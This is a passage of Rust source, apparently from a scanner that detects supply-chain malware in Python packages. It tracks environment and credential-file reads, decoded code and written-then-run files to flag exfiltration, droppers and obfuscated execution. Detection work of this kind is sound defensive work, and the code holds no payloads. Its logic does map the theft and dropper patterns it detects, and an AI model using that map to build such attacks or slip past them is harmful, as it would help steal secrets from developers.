        if self.sup().own_starts.is_empty() {
            return v;
        }
        let hi = self.t().node(func).end;
        if self.sc_own_in(lo, hi) {
            return v.union(&self.sc_source(K_OWN, u("its own file"), lo, 0));
        }
        let names = self.sc_names(func);
        if any_of(&names, USAGE_PARSERS) {
            return taint_without(v, K_OWN);
        }
        v
    }

    /// supply mode: a variable of a function around this one (a closure's).
    pub(super) fn sc_closure(&self, name: NameId) -> Option<Taint> {
        let func = &self.p.fns[self.f as usize];
        if func.local_names.contains(&name) {
            return None;
        }
        let mut at = func.parent;
        let mut hops = 0;
        while let Some(f) = at {
            if hops > 16 {
                break;
            }
            if let Some(v) = self.p.closure.get(&f).and_then(|vars| vars.get(&name)) {
                return Some(v.clone());
            }
            if self.p.fns[f as usize].local_names.contains(&name) {
                return None;
            }
            at = self.p.fns[f as usize].parent;
            hops += 1;
        }
        None
    }

    /// supply mode: a string constant: a path outside the package (a read
    /// of it is a file), else nothing.
    pub(super) fn sc_literal(&self, e: NodeId) -> Taint {
        let value = match self.sc_const_str(e) {
            Some(v) if !v.is_empty() => v,
            _ => return Taint::empty(),
        };
        let first = value[0];
        let drive = value.len() > 2 && value[1] == 0x3A && (value[2] == 0x5C || value[2] == 0x2F);
        if !(first == 0x2F || first == 0x7E || first == 0x24 || first == 0x25 || drive) {
            return Taint::empty();
        }
        let sup = self.sup();
        let (lo, hi) = {
            let n = self.t().node(e);
            (n.start, n.end)
        };
        let span = sup.span(lo, hi);
        if sup.p().re("_LD_FS_ROOT_RE").match_(span).is_none() && sup.p().re("_LD_CRED_FILE_RE").match_(span).is_none() {
            return Taint::empty();
        }
        self.sc_source(K_PATH, shown_what(sup.p(), &value), lo, 0)
    }

    /// supply mode: an attribute: os.environ (the whole environment, the
    /// object a subscript or `.get` reads one variable of), else None.
    pub(super) fn sc_attribute(&mut self, e: NodeId) -> Result<Option<Taint>, Halt> {
        let attr_text = {
            let t = self.t();
            t.str(b_(t, e)).to_vec()
        };
        if eq(&attr_text, "environ") || eq(&attr_text, "environb") {
            let names = self.sc_names(e);
            if names.iter().any(|n| eq(n, "os.environ") || eq(n, "os.environb")) {
                let whole = self.sup().whole.clone();
                return Ok(Some(self.sc_source(K_WHOLE_ENV, whole, self.start(e), OBJ_ENV)));
            }
        }
        Ok(None)
    }

    /// supply mode: a subscript of `base` with `key`: one variable of the
    /// environment by its name, else None.
    pub(super) fn sc_subscript(&mut self, e: NodeId, base: &Taint, k: &Taint) -> Option<Taint> {
        if base.marks & OBJ_ENV == 0 {
            return self.sc_env_entry(e, base);
        }
        let slice = b_(self.t(), e);
        let at = self.start(e);
        if let Some(name) = self.sc_const_str(slice) {
            return Some(self.sc_env_var(&name, at));
        }
        // a name the environment gives (its keys: a copy of it), a caller's
        if k.sc.as_ref().is_some_and(|s| s.kinds & K_WHOLE_ENV != 0) {
            return Some(base.plain());
        }
        for &p in k.params.iter() {
            self.sink_adds.push((p, ENV_NAME, (self.f, at)));
        }
        Some(Taint::empty())
    }

    /// supply mode: an entry of a value that holds the environment and
    /// nothing else, by a constant name (`self._environ[HOST_VAR]` where the
    /// object was given `os.environ`, `proxies['http']` of a dict filled from
    /// it): that one variable, as `os.environ[name]` reads it, not the whole
    /// environment. kubernetes' in-cluster config and future's urllib
    /// backport build a URL from such entries. None: not such a value or key.
    fn sc_env_entry(&mut self, e: NodeId, base: &Taint) -> Option<Taint> {
        let kinds = base.sc.as_ref()?.kinds;
        if kinds & K_WHOLE_ENV == 0 || kinds & !(K_WHOLE_ENV | K_ENV | K_PATH | K_IDENTITY) != 0 {
            return None;
        }
        let slice = b_(self.t(), e);
        let names = self.sc_key_strs(slice)?;
        if names.is_empty() {
            return None;
        }
        let at = self.start(e);
        let mut out = Taint::empty();
        for name in names {
            out = out.union(&self.sc_env_var(&name, at));
        }
        Some(out)
    }

    /// The constant strings a subscript's key may be: a literal, or a name
    /// the function, or a function or module around it, gives constants.
    fn sc_key_strs(&mut self, slice: NodeId) -> Option<Vec<PyStr>> {
        if let Some(s) = self.sc_const_str(slice) {
            return Some(vec![s]);
        }
        if self.t().kind(slice) != Kind::Name {
            return None;
        }
        if let Some(found) = self.sc_const_strs(slice, 0) {
            return Some(found);
        }
        // (a name the module gives a constant: `SERVICE_HOST_ENV_NAME = "…"`)
        let name = self.t().str(a_(self.t(), slice)).to_vec();
        let saved = self.f;
        let mut scopes: Vec<FnId> = Vec::new();
        let mut at = self.p.fns[saved as usize].parent;
        while let Some(f) = at {
            if scopes.len() > 8 {
                break;
            }
            scopes.push(f);
            at = self.p.fns[f as usize].parent;
        }
        let body = self.p.mods[self.p.fns[saved as usize].module as usize].body_fn;
        if body != saved && !scopes.contains(&body) {
            scopes.push(body);
        }
        let mut found = None;
        for f in scopes {
            self.f = f;
            let ix = self.sc_index(f);
            if ix.assigns.contains_key(&name) {
                found = self.sc_const_strs_of(&name, 0);
                break;
            }
        }
        self.f = saved;
        found
    }

    /// supply mode: does a comprehension over the environment's variables
    /// select some of them (`{k: v for k, v in os.environ.items() if
    /// k.startswith('X_')}`): not the whole of it, unless the test excludes
    /// some or names secrets (the text follower's _LD_ENV_SELECT_RE)?
    pub(super) fn sc_selects_env(&self, it: &Taint, ifs: &[NodeId]) -> bool {
        if ifs.is_empty() || !it.sc.as_ref().is_some_and(|s| s.kinds & K_WHOLE_ENV != 0) {
            return false;
        }
        let sup = self.sup();
        let p = sup.p();
        ifs.iter().all(|&c| {
            let n = self.t().node(c);
            let cond = sup.span(n.start, n.end);
            p.re("_LD_EXCLUDES_RE").search(cond).is_none() && p.re("_SH_SECRET_VAR_RE").search(cond).is_none()
        })
    }

    /// supply mode: a lambda: what its body sends or runs (its parameters
    /// hold nothing). Its value is a function's: nothing.
    pub(super) fn sc_lambda(&mut self, e: NodeId) -> Result<(), Halt> {
        let body = b_(self.t(), e);
        let saved = self.env.clone();
        let r = self.expr(body);
        self.env = saved;
        r.map(|_| ())
    }

    /// The text before a format's first hole, or a sum's first literal,
    /// when `n` begins with one: an f-string's, `'…' + x`, `'…%s' % x`.
    fn sc_head_text(&self, n: NodeId) -> Option<PyStr> {
        let t = self.t();
        match t.kind(n) {
            Kind::JoinedStr => {
                let vals = t.list(a_(t, n));
                vals.first().and_then(|&v| self.sc_const_str(v))
            }
            Kind::BinOp => {
                let mut lead = n;
                let mut seen = 0;
                while self.t().kind(lead) == Kind::BinOp && seen < 64 {
                    lead = a_(self.t(), lead);
                    seen += 1;
                }
                self.sc_const_str(lead).or_else(|| if self.t().kind(lead) == Kind::JoinedStr { self.sc_head_text(lead) } else { None })
            }
            Kind::Constant => self.sc_const_str(n),
            Kind::Call => {
                // '…{}'.format(x)
                let func = a_(t, n);
                if t.kind(func) == Kind::Attribute && eq(t.str(b_(t, func)), "format") {
                    return self.sc_const_str(a_(t, func));
                }
                None
            }
            _ => None,
        }
    }

    /// supply mode: an f-string: what its holes put in a URL's host name is
    /// sent (resolved: the text follower's `_LD_HOST_BUILT_RE`).
    pub(super) fn sc_fstring(&mut self, e: NodeId, parts: &[(NodeId, Taint)]) {
        let mut acc: PyStr = Vec::new();
        for (n, v) in parts {
            if let Some(s) = self.sc_const_str(*n) {
                acc.extend_from_slice(&s);
                continue;
            }
            if v.tainted() && host_prefix(&acc) {
                let at = self.start(e);
                self.sc_reach(&v.plain(), SEND_DATA, at);
            }
            acc.push(0x78);
        }
    }

    /// supply mode: `'https://' + x`, `'https://%s.x.com' % x`: what goes
    /// into the host name is sent.
    pub(super) fn sc_binop(&mut self, e: NodeId, right: &Taint) {
        if !right.tainted() {
            return;
        }
        let (left, op) = {
            let t = self.t();
            (a_(t, e), t.node(e).op)
        };
        let text = match self.sc_const_str(left) {
            Some(s) => s,
            None => return,
        };
        let head: PyStr = if op == pt::MOD {
            match text.iter().position(|&c| c == 0x25) {
                Some(k) => text[..k].to_vec(),
                None => return,
            }
        } else if op == pt::ADD {
            text
        } else {
            return;
        };
        if host_prefix(&head) {
            let at = self.start(left);
            self.sc_reach(&right.plain(), SEND_DATA, at);
        }
    }

    /// A value at a send's argument (or a received-code sink's): the
    /// parameters it holds reach it (the function's summary); local data in
    /// it is the finding.
    pub(super) fn sc_reach(&mut self, v: &Taint, cat: u8, at: u32) {
        if !v.tainted() {
            return;
        }
        // (what a request to the caller's address receives: the address reaches it)
        let pcat = if v.marks & FETCHED != 0 { fetch_cat(cat).unwrap_or(cat) } else { cat };
        for &p in v.params.iter() {
            self.sink_adds.push((p, pcat, (self.f, at)));
        }
        if v.source && self.emit {
            if let Some(sc) = v.sc.clone() {
                if cat == SEND_DATA || cat == SEND_ADDR {
                    self.sc_emit(&sc, cat == SEND_ADDR, at);
                } else if sc.kinds & K_RECEIVED != 0 {
                    if let Some(name) = received_cat(cat) {
                        self.findings.push(Out::Received { at, cat: name });
                    }
                }
                // (code the script reads back from itself, run: N-19)
                if cat == RUN_CODE && sc.kinds & K_OWN != 0 {
                    self.findings.push(Out::Own { at });
                }
                // (code the script decodes, run)
                if cat == RUN_CODE {
                    if let Some(from) = decoded_at(&sc) {
                        self.findings.push(Out::Decoded { at, from });
                    }
                }
            }
        }
    }

    /// supply mode: a value the script decodes at `at`, holding what `v`
    /// holds.
    pub(super) fn sc_decoded(&self, v: &Taint, what: &str, at: u32) -> Taint {
        v.plain().union(&self.sc_source(K_DECODED, u(what), at, 0))
    }

    /// supply mode: is `n` a call of `chr`?
    pub(super) fn sc_chr_call(&self, n: NodeId) -> bool {
        let t = self.t();
        n != NONE && t.kind(n) == Kind::Call && {
            let f = a_(t, n);
            t.kind(f) == Kind::Name && eq(t.str(a_(t, f)), "chr")
        }
    }

    /// supply mode: is the slice `s` a reversal (`[::-1]`)?
    pub(super) fn sc_reversal(&self, s: NodeId) -> bool {
        let t = self.t();
        if s == NONE || t.kind(s) != Kind::Slice || a_(t, s) != NONE || b_(t, s) != NONE {
            return false;
        }
        let step = c_(t, s);
        step != NONE
            && t.kind(step) == Kind::UnaryOp
            && t.node(step).op == pt::USUB
            && t.kind(a_(t, step)) == Kind::Constant
            && eq(t.str(a_(t, a_(t, step))), "1")
    }

    /// supply mode: is `n` a sequence of items and no text: a list, tuple,
    /// set or dict display or comprehension, a call of `list`, `tuple`,
    /// `sorted` or `range`, or a name the function gives only those
    /// (`ids = []` … `ids.append(x)`)? Its reversal (`ids[::-1]`) reorders
    /// items and decodes nothing: sympy's `lambdify` and IPython's completer
    /// reverse lists of namespaces and of names.
    pub(super) fn sc_items_not_text(&mut self, n: NodeId, depth: u32) -> bool {
        if depth > 3 || n == NONE {
            return false;
        }
        let t = self.t();
        match t.kind(n) {
            Kind::List | Kind::Tuple | Kind::Set | Kind::Dict | Kind::ListComp | Kind::SetComp | Kind::DictComp
            | Kind::GeneratorExp => true,
            Kind::Call => {
                let f = a_(t, n);
                t.kind(f) == Kind::Name && is_one(t.str(a_(t, f)), &["list", "tuple", "sorted", "range"])
            }
            Kind::Name => {
                let name = t.str(a_(t, n)).to_vec();
                let ix = self.sc_index(self.f);
                if ix.loops.contains_key(&name) {
                    return false;
                }
                let values = match ix.assigns.get(&name) {
                    Some(v) if !v.is_empty() && v.len() < 9 => v.clone(),
                    _ => return false,
                };
                values.iter().all(|&v| self.sc_items_not_text(v, depth + 1))
            }
            _ => false,
        }
    }

    /// The finding for local data `sc` at a send.
    pub(super) fn sc_emit(&mut self, sc: &Sc, address: bool, at: u32) {
        // (a harvest first, then the first read)
        let pick = |strong_only: bool| {
            sc.firsts
                .iter()
                .filter(|(k, _, _)| (1u16 << k) & NOT_LOCAL == 0)
                .filter(|(k, _, _)| !strong_only || (1u16 << k) & STRONG_IN_ADDRESS != 0)
                .min_by_key(|(k, _, a)| ((1u16 << k) & HARVEST == 0, *a))
                .cloned()
        };
        let (chosen, in_address) = if !address {
            (pick(false), false)
        } else {
            match pick(true) {
                Some(c) => (Some(c), false),
                None => (pick(false), true),
            }
        };
        if let Some((k, what, _)) = chosen {
            self.findings.push(Out::Send { at, kind: KIND_NAMES[k as usize], what: (*what).clone(), in_address });
        }
    }

    /// Is an expression made of what the function's caller gives it: a
    /// value that holds a parameter, or one that reads the receiver
    /// (`self.base_url + path`)?
    fn sc_from_caller(&self, n: NodeId, v: Option<&Taint>) -> bool {
        if v.is_some_and(|v| !v.params.is_empty()) {
            return true;
        }
        let recv = self.p.fns[self.f as usize].receiver;
        let recv = match recv {
            Some(r) => r,
            None => return false,
        };
        let t = self.t();
        let mut stack = vec![n];
        let mut seen = 0;
        while let Some(x) = stack.pop() {
            seen += 1;
            if x == NONE || seen > 256 {
                continue;
            }
            match t.kind(x) {
                Kind::Name => {
                    let sid = a_(t, x);
                    if self.p.names.find(t.str(sid)) == Some(recv) {
                        return true;
                    }
                }
                Kind::Lambda => {}
                _ => t.each_child(x, |c| stack.push(c)),
            }
        }
        false
    }

    /// The constant text a command line begins with: a string, an f-string's
    /// or a sum's first literal, an argument list's first item.
    fn sc_command_head(&self, n: NodeId) -> Option<PyStr> {
        let t = self.t();
        if matches!(t.kind(n), Kind::List | Kind::Tuple) {
            let first = *t.list(a_(t, n)).first()?;
            return self.sc_const_str(first);
        }
        self.sc_head_text(n)
    }

    /// The command line a call runs, when it is constant: its first argument
    /// (an argument list's items joined).
    fn sc_command_line(&self, n: NodeId) -> Option<PyStr> {
        let t = self.t();
        if matches!(t.kind(n), Kind::List | Kind::Tuple) {
            let mut argv: Vec<PyStr> = Vec::new();
            for &x in t.list(a_(t, n)) {
                argv.push(self.sc_const_str(x)?);
            }
            if argv.is_empty() {
                return None;
            }
            let parts: Vec<&[u32]> = argv.iter().map(|x| x.as_slice()).collect();
            return Some(pystr::join(&u(" "), &parts));
        }
        self.sc_const_str(n)
    }

    /// The strings a name may be, when they are constants: what the
    /// function (or the module) gives it, a constant list's items a `for`
    /// loop gives it. Bounded.
    fn sc_const_strs(&mut self, n: NodeId, depth: u32) -> Option<Vec<PyStr>> {
        if depth > 4 || n == NONE {
            return None;
        }
        if let Some(s) = self.sc_const_str(n) {
            return Some(vec![s]);
        }
        let t = self.t();
        match t.kind(n) {
            Kind::List | Kind::Tuple | Kind::Set => {
                let items: Vec<NodeId> = t.list(a_(t, n)).iter().copied().take(64).collect();
                let mut out = Vec::new();
                for x in items {
                    out.extend(self.sc_const_strs(x, depth + 1)?);
                }
                Some(out)
            }
            Kind::Name => {
                let name = t.str(a_(t, n)).to_vec();
                let memo_key = (self.f, name.clone());
                if let Some(hit) = self.sup().const_memo.borrow().get(&memo_key) {
                    return hit.clone();
                }
                let got = self.sc_const_strs_of(&name, depth);
                self.sup().const_memo.borrow_mut().insert(memo_key, got.clone());
                got
            }
            _ => None,
        }
    }

    /// The constant strings the function gives a name (sc_const_strs).
    fn sc_const_strs_of(&mut self, name: &[u32], depth: u32) -> Option<Vec<PyStr>> {
        let ix = self.sc_index(self.f);
        if let Some(&it) = ix.loops.get(name) {
            // an item of what the loop goes over
            return self.sc_const_strs(it, depth + 1);
        }
        let values = ix.assigns.get(name)?.clone();
        if values.is_empty() || values.len() > 8 {
            return None;
        }
        let mut out = Vec::new();
        for v in values {
            out.extend(self.sc_const_strs(v, depth + 1)?);
        }
        Some(out)
    }

    /// Is an argument a name composed with a literal (`f"{h}.x.com"`,
    /// `h + '.x.com'`, `'%s.x' % h`, `'.'.join(…)`)?
    fn sc_composed(&self, n: NodeId) -> bool {
        let t = self.t();
        match t.kind(n) {
            Kind::JoinedStr => {
                let vals = t.list(a_(t, n));
                vals.iter().any(|&v| t.kind(v) == Kind::FormattedValue)
                    && vals.iter().any(|&v| self.sc_const_str(v).is_some_and(|s| !s.is_empty()))
            }
            Kind::BinOp => {
                let mut stack = vec![n];
                let mut seen = 0;
                while let Some(x) = stack.pop() {
                    seen += 1;
                    if seen > 64 {
                        break;
                    }
                    if self.sc_const_str(x).is_some() {
                        return true;
                    }
                    if t.kind(x) == Kind::BinOp {
                        stack.push(a_(t, x));
                        stack.push(b_(t, x));
                    }
                }
                false
            }
            Kind::Call => {
                let func = a_(t, n);
                t.kind(func) == Kind::Attribute && {
                    let m = t.str(b_(t, func));
                    eq(m, "join") || eq(m, "format")
                }
            }
            _ => false,
        }
    }

    /// A name given a composed value in the function or the module (`t =
    /// f'{d}.x.com'` before `socket.getaddrinfo(t, 80)`).
    fn sc_composed_name(&mut self, n: NodeId) -> bool {
        if self.t().kind(n) != Kind::Name {
            return false;
        }
        let name = self.t().str(a_(self.t(), n)).to_vec();
        let fns = {
            let mut v = vec![self.f];
            let body_fn = self.p.mods[self.m as usize].body_fn;
            if body_fn != self.f {
                v.push(body_fn);
            }
            v
        };
        for f in fns {
            let ix = self.sc_index(f);
            if let Some(values) = ix.assigns.get(&name) {
                if values.iter().any(|&v| self.sc_composed(v)) {
                    return true;
                }
            }
        }
        false
    }

    /// The constant text an interpreter's argument list holds as code: the
    /// item after an eval flag (`[sys.executable, '-c', code]`), if the
    /// list's first item is an interpreter.
    fn sc_interp_code(&mut self, list: NodeId) -> Option<NodeId> {
        let items: Vec<NodeId> = {
            let t = self.t();
            if !matches!(t.kind(list), Kind::List | Kind::Tuple) {
                return None;
            }
            t.list(a_(t, list)).to_vec()
        };
        let first = *items.first()?;
        if !self.sc_interpreter(first) {
            return None;
        }
        for k in 1..items.len().min(8) {
            if self.sc_const_str(items[k]).is_some_and(|s| is_one(&s, EVAL_FLAGS)) {
                return items.get(k + 1).copied();
            }
        }
        None
    }

    /// Is a node an interpreter's name, or `sys.executable`?
    fn sc_interpreter(&mut self, n: NodeId) -> bool {
        match self.sc_const_str(n) {
            Some(s) => {
                let base = match s.iter().rposition(|&c| c == 0x2F || c == 0x5C) {
                    Some(k) => &s[k + 1..],
                    None => &s[..],
                };
                let base = if base.len() > 4 && eq(&base[base.len() - 4..], ".exe") { &base[..base.len() - 4] } else { base };
                is_one(base, INTERPRETERS) || (base.len() > 6 && eq(&base[..6], "python"))
            }
            None => {
                let kind = self.t().kind(n);
                matches!(kind, Kind::Attribute | Kind::Name) && self.sc_names(n).iter().any(|x| eq(x, "sys.executable"))
            }
        }
    }

    /// The interpreter a program node is, as reasons name it (`Python` for
    /// `sys.executable`).
    fn sc_interp_name(&mut self, n: NodeId) -> Option<PyStr> {
        match self.sc_const_str(n) {
            Some(s) => interp_name(&s),
            None => self.sc_interpreter(n).then(|| u("Python")),
        }
    }

    // ------------------------------------------- a file written, then run --

    /// The function a name belongs to: a parameter or a local of the
    /// function or of one around it; else the module's body.
    fn sc_name_scope(&self, name: &[u32]) -> FnId {
        let body = self.p.mods[self.m as usize].body_fn;
        let id = match self.p.names.find(name) {
            Some(k) => k,
            None => return body,
        };
        let mut at = Some(self.f);
        while let Some(f) = at {
            if f == body {
                break;
            }
            let func = &self.p.fns[f as usize];
            if func.pnames.contains(&id) || func.local_names.contains(&id) {
                return f;
            }
            at = func.parent;
        }
        body
    }

    /// The keys of the path a node names, to tell a file run is one the
    /// script wrote: its text in the scope of the names it reads (a local
    /// `p` of one function is not another's), the strings it holds (a
    /// literal, a name given literals), and those of what a wrapper is
    /// given (`str(p)`, `os.path.abspath(p)`, `Path(p)`, `f'{p}'`,
    /// `p.resolve()`).
    fn sc_path_keys(&mut self, n: NodeId) -> Vec<PyStr> {
        let mut keys = Vec::new();
        self.sc_path_keys_at(n, 0, &mut keys);
        keys.sort_unstable();
        keys.dedup();
        keys
    }

    fn sc_path_keys_at(&mut self, n: NodeId, depth: u32, keys: &mut Vec<PyStr>) {
        if n == NONE || depth > 3 {
            return;
        }
        let kind = self.t().kind(n);
        if kind == Kind::Constant {
            if let Some(s) = self.sc_const_str(n) {
                keys.push(value_key(&s));
            }
            return;
        }
        let scope = {
            let names: Vec<PyStr> = {
                let t = self.t();
                own_nodes(t, &[n]).into_iter().filter(|&x| t.kind(x) == Kind::Name).map(|x| t.str(a_(t, x)).to_vec()).collect()
            };
            let body = self.p.mods[self.m as usize].body_fn;
            names.iter().map(|x| self.sc_name_scope(x)).find(|&f| f != body).unwrap_or(body)
        };
        let mut k = u(&format!("{}:", scope));
        k.extend(text_key(&self.node_text(n)));
        keys.push(k);
        match kind {
            Kind::Name => {
                if let Some(values) = self.sc_const_strs(n, 0) {
                    keys.extend(values.iter().map(|v| value_key(v)));
                }
            }
            Kind::Call => {
                let (func, args) = {
                    let t = self.t();
                    (a_(t, n), t.list(b_(t, n)).to_vec())
                };
                let names = self.sc_names(func);
                let wrapper = any_of(&names, PATH_WRAPPERS) || names.iter().any(|x| is_one(last(x), PATH_TYPES));
                if wrapper && args.len() == 1 {
                    self.sc_path_keys_at(args[0], depth + 1, keys);
                } else if args.is_empty() && self.t().kind(func) == Kind::Attribute {
                    let (obj, m) = {
                        let t = self.t();
                        (a_(t, func), t.str(b_(t, func)).to_vec())
                    };
                    if is_one(&m, &["resolve", "absolute", "as_posix", "expanduser"]) {
                        self.sc_path_keys_at(obj, depth + 1, keys);
                    }
                }
            }
            Kind::JoinedStr => {
                let values: Vec<NodeId> = {
                    let t = self.t();
                    t.list(a_(t, n)).to_vec()
                };
                if values.len() == 1 && self.t().kind(values[0]) == Kind::FormattedValue {
                    let v = a_(self.t(), values[0]);
                    self.sc_path_keys_at(v, depth + 1, keys);
                }
            }
            _ => {}
        }
    }

    /// The mode a call opening a file gives it (`open(p, 'wb')`,
    /// `p.open(mode='rb')`), with the node of the path it opens; None for
    /// another call.
    fn sc_open_mode(&mut self, call: NodeId, names: &[PyStr], method: Option<&[u32]>) -> Option<(PyStr, NodeId)> {
        // (asked of every call: the names first, the arguments only for an open)
        let opener = any_of_ascii(names, OPENERS);
        if !opener && !method.is_some_and(|m| eq(m, "open")) {
            return None;
        }
        let (func, args) = {
            let t = self.t();
            (a_(t, call), t.list(b_(t, call)).to_vec())
        };
        let (path, mode_at) = if !opener {
            // a path's own open: the receiver is the path
            (a_(self.t(), func), 0)
        } else {
            (*args.first()?, 1)
        };
        let mode = match args.get(mode_at) {
            Some(&m) => self.sc_const_str(m),
            None => self.sc_keyword(call, "mode").and_then(|m| self.sc_const_str(m)),
        };
        let mode = mode.unwrap_or_else(|| u("r"));
        // (a mode: `tarfile.open(name)`, `webbrowser.open(url)` give none)
        if mode.is_empty() || mode.len() > 4 || !mode.iter().all(|&c| "rwabxtU+".chars().any(|m| m as u32 == c)) {
            return None;
        }
        Some((mode, path))
    }

    /// supply mode: what a binary read of a file gives (`open(p, 'rb')`,
    /// `p.open('rb')`, `p.read_bytes()`): its bytes (K_BYTES, what: the
    /// file).
    /// (`opened`: the call's [`Self::sc_open_mode`].)
    fn sc_binary_read(&mut self, call: NodeId, method: Option<&[u32]>, opened: Option<&(PyStr, NodeId)>) -> Option<Taint> {
        let at = self.start(call);
        let file = if method.is_some_and(|m| eq(m, "read_bytes")) {
            a_(self.t(), a_(self.t(), call))
        } else {
            let (mode, path) = opened?;
            if !mode.contains(&0x62) || mode.iter().any(|&c| c == 0x77 || c == 0x61 || c == 0x78 || c == 0x2B) {
                return None;
            }
            *path
        };
        // (a name given the path: the path; a path joined: its literal end)
        let what = match self.sc_const_strs(file, 0).and_then(|v| v.into_iter().next()).or_else(|| self.sc_path_tail(file, 0)) {
            Some(v) => pystr::upto(&v, 60).to_vec(),
            None => self.sc_read_what(file),
        };
        Some(self.sc_source(K_BYTES, what, at, 0))
    }

    /// The literal end of a path a node builds, to name the file
    /// (`os.path.join(here, 'docs', 'logo.png')`: docs/logo.png; `d /
    /// 'x.bin'`, `d + '/x.bin'`, `f'{d}/x.bin'`).
    fn sc_path_tail(&mut self, n: NodeId, depth: u32) -> Option<PyStr> {
        if depth > 4 {
            return None;
        }
        let t = self.t();
        let parts: Vec<NodeId> = match t.kind(n) {
            Kind::Call => {
                let func = a_(t, n);
                let args = t.list(b_(t, n)).to_vec();
                let joins = {
                    let names = self.sc_names(func);
                    any_of(&names, &["os.path.join", "posixpath.join", "ntpath.join", "pathlib.Path", "pathlib.PurePath"])
                        || names.iter().any(|x| is_one(last(x), &["joinpath", "Path", "PurePath"]))
                };
                if !joins {
                    return None;
                }
                args
            }
            Kind::BinOp if matches!(t.node(n).op, pt::ADD | pt::DIV) => vec![a_(t, n), b_(t, n)],
            Kind::JoinedStr => t.list(a_(t, n)).to_vec(),
            _ => return None,
        };
        let mut tail: Vec<PyStr> = Vec::new();
        for &x in parts.iter().rev() {
            match self.sc_const_str(x) {
                Some(v) => tail.push(v),
                None => {
                    if let Some(v) = self.sc_path_tail(x, depth + 1) {
                        tail.push(v);
                    }
                    break;
                }
            }
        }
        if tail.is_empty() {
            return None;
        }
        tail.reverse();
        let mut out: PyStr = Vec::new();
        for (k, piece) in tail.iter().enumerate() {
            let piece = pystr::strip_chars(piece, "/\\");
            if piece.is_empty() {
                continue;
            }
            if k > 0 && !out.is_empty() {
                out.push(0x2F);
            }
            out.extend_from_slice(piece);
        }
        (!out.is_empty()).then_some(out)
    }

    /// supply mode: a call that writes a file. `open(p, 'w…')` is the file
    /// (its value, K_WFILE, carries the path's keys); `f.write(d)`,
    /// `Path(p).write_bytes(d)` and `urlretrieve(url, p)` record what they
    /// write where (`Supply::written`). Some((value, whether it is read
    /// too: `'w+'`)) for an open. (`opened`: the call's
    /// [`Self::sc_open_mode`].)
    fn sc_file_write(
        &mut self,
        call: NodeId,
        names: &[PyStr],
        method: Option<&[u32]>,
        recv: &Taint,
        pos: &[Taint],
        opened: Option<&(PyStr, NodeId)>,
    ) -> Option<(Taint, bool)> {
        let at = self.start(call);
        if let Some((mode, path)) = opened {
            if !mode.iter().any(|&c| c == 0x77 || c == 0x61 || c == 0x78) {
                return None;
            }
            let keys = self.sc_path_keys(*path);
            let what = pystr::join(&u("\n"), &keys.iter().map(|k| k.as_slice()).collect::<Vec<_>>());
            return Some((self.sc_source(K_WFILE, what, at, 0), mode.contains(&0x2B)));
        }
        let m = method.unwrap_or(&[]);
        let (keys, data): (Vec<PyStr>, Option<Taint>) = if is_one_ascii(m, &["write", "writelines"]) {
            let file = match recv.sc.as_ref().and_then(|s| s.firsts.iter().find(|(k, _, _)| (1u16 << k) == K_WFILE).cloned()) {
                Some((_, what, _)) => what,
                None => return None,
            };
            (pystr::split_char(file.as_slice(), 0x0A).into_iter().map(|k| k.to_vec()).collect(), pos.first().cloned())
        } else if is_one_ascii(m, &["write_bytes", "write_text"]) {
            let obj = a_(self.t(), a_(self.t(), call));
            (self.sc_path_keys(obj), pos.first().cloned())
        } else if any_of_ascii(names, &["urllib.request.urlretrieve", "urllib.urlretrieve"]) {
            let dest = {
                let t = self.t();
                t.list(b_(t, call)).get(1).copied()
            };
            match dest {
                Some(d) => (self.sc_path_keys(d), Some(self.sc_source(K_RECEIVED, u("a download"), at, 0))),
                None => return None,
            }
        } else {
            return None;
        };
        if let Some(sc) = data.as_ref().filter(|d| d.source).and_then(|d| d.sc.clone()) {
            record_written(&self.sup().written, keys, &sc, at);
        }
        None
    }

    /// supply mode: a call that runs a program (`subprocess.Popen([p])`,
    /// `os.system(p)`, an interpreter given a script): a file the script
    /// wrote with code or a program it decodes, carves out of another file,
    /// or downloads (a script run by an interpreter) is a dropper's; a
    /// program it decodes, run, is code it decodes.
    fn sc_file_run(&mut self, call: NodeId, names: &[PyStr], pos: &[Taint]) -> Result<(), Halt> {
        // (asked of every call: each table read once)
        let in_shells = any_of_ascii(names, SHELLS);
        let in_spawns = !in_shells && any_of_ascii(names, SPAWNS);
        let index = if in_shells || in_spawns || any_of_ascii(names, PROGRAM_RUNS) {
            0
        } else if any_of_ascii(names, MODE_RUNS) {
            1
        } else {
            return Ok(());
        };
        let shell = in_shells
            || (in_spawns && self.sc_keyword(call, "shell").is_some_and(|sh| {
                let t = self.t();
                t.kind(sh) == Kind::Constant && t.node(sh).op == pt::V_TRUE
            }));
        let at = self.start(call);
        let arg = match {
            let t = self.t();
            t.list(b_(t, call)).get(index).copied()
        } {
            Some(a) => a,
            None => return Ok(()),
        };
        // the programs and scripts it runs: (node, interpreter)
        let mut runs: Vec<(NodeId, Option<PyStr>)> = Vec::new();
        let mut lines: Vec<PyStr> = Vec::new();
        let kind = self.t().kind(arg);
        if matches!(kind, Kind::List | Kind::Tuple) {
            let items: Vec<NodeId> = {
                let t = self.t();
                t.list(a_(t, arg)).to_vec()
            };
            if let Some(&first) = items.first() {
                runs.push((first, None));
                if let Some(interp) = self.sc_interp_name(first) {
                    let script = items[1..].iter().copied().take(6).find(|&x| !self.sc_const_str(x).is_some_and(|s| is_flag(&s)));
                    if let Some(s) = script {
                        runs.push((s, Some(interp)));
                    }
                }
                // (a program it decodes)
                if !shell && self.t().kind(first) != Kind::Constant {
                    let v = self.expr(first)?;
                    self.sc_decoded_program(&v, at);
                }
            }
        } else {
            if kind == Kind::Constant {
                lines.extend(self.sc_const_str(arg));
            } else if kind == Kind::Name && (shell || index > 0) {
                lines.extend(self.sc_const_strs(arg, 0).unwrap_or_default());
            }
            // a command line made of parts: its programs, the scripts an
            // interpreter is given
            let parts = self.sc_parts(arg);
            runs.extend(run_parts(&parts));
            if !shell && kind != Kind::Constant {
                if let Some(v) = pos.get(index) {
                    self.sc_decoded_program(&v.clone(), at);
                }
            }
        }
        if !self.emit {
            return Ok(());
        }
        let sup = self.sup();
        for (n, interp) in runs {
            let keys = self.sc_path_keys(n);
            if let Some(w) = written_at(&sup.written, &keys) {
                self.sc_dropped(&w, interp, at);
                return Ok(());
            }
        }
        // a constant command line: a written file it runs (`_DL_RUNNERS`)
        if !lines.is_empty() {
            let table = sup.written.borrow().clone();
            for w in table {
                for k in w.keys.iter().filter(|k| k.first() == Some(&0x3D)) {
                    // (the command of the line that runs it: an interpreter's?)
                    let seg = lines.iter().flat_map(|l| l.split(|&c| c == 0x3B || c == 0x26 || c == 0x7C || c == 0x0A)).find(|seg| {
